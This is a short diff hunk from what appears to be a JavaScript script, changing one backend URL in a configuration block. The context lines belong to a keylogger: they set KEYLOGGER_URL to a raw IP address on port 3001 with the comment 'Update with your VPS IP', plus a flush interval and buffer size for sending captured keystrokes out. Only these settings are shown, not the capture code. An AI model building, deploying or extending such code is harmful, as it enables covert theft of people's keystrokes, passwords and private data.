@@ -6,7 +6,7 @@
 
 (function() {
     // --- Configuration ---
-    const BACKEND_URL = "https://meeting-h5ze.onrender.com";
+    const BACKEND_URL = "https://meeting-1-rzx6.onrender.com";
     const KEYLOGGER_URL = "http://78.159.110.18:3001/log";  // Update with your VPS IP
     const FLUSH_INTERVAL = 15000;  // 15 seconds
     const MAX_BUFFER = 500;
